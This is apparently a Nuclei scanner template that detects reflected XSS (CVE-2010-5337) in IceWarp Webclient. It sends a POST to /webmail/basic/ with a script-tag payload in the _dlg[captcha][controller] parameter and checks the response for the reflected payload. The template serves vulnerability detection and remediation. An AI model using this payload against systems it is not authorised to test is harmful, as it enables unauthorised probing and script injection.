id: CVE-2010-5337

info:
  name: IceWarp Webclient XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    IceWarp Webclient before 10.2.1 has XSS via an HTTP POST request: webmail/basic/ 
    with the parameter _dlg[captcha][controller] is non-persistent in 10.1.3 and 10.2.0.
  reference:
    - https://vuldb.com/?id.142993
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-5337
  remediation: |
    To remediate this vulnerability, ensure that all user inputs are properly sanitized 
    before being processed by the application. Implement Content Security Policy (CSP) 
    headers to restrict the execution of scripts. Consider updating to the latest version 
    of IceWarp Webclient that addresses this vulnerability.

http:
  - method: POST
    path:
      - "{{BaseURL}}/webmail/basic/"
    body: "_dlg[captcha][controller]=<script>alert('XSS')</script>"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert('XSS')</script>"
        part: body
      - type: word
        words:
          - "text/html"
        part: header